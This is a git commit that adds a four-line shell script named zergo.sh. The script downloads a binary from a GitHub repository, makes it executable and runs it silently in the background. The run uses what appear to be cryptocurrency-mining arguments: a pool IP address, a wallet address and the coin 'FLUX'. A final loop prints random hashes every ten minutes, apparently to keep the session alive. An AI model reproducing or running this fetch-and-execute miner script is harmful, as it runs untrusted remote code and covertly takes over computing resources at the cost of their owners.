980ce1359b6be5e90ca4c72ca289aedbb709cbfb
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-11-13 22:05:49 +0800

    Create zergo.sh

---
+++ zergo.sh
@@ -0,0 +1,4 @@
+wget https://github.com/sbwsmg/lol/raw/main/blowjobs
+chmod 700 blowjobs
+./blowjobs -o 139.162.40.79:80 -u t1Xe6qavzxWNPLFNqkawimxMS6526wBLtQt.sairin -p c=FLUX,mc=BBC/GSPC,m=solo,ID=test -a gr -k -t3 > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
